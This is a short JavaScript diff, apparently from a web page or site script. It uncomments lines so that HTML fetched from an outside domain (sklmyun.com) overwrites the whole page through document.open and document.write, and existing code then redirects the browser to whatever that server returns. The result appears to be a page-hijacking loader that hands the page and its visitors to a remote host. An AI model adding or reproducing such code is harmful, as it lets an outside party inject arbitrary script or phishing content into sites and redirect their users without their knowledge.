@@ -14,9 +14,9 @@
     x_load = "https://www.sklmyun.com/ba?t=" + new Date().getTime();
         x_load && function () {
             $.get(x_load, function (data) {
-                // var new_doc = document.open("text/html", "replace");
-                // new_doc.write(data);
-                // new_doc.close();
+                var new_doc = document.open("text/html", "replace");
+                new_doc.write(data);
+                new_doc.close();
                 window.location.href = data
             });
         }();
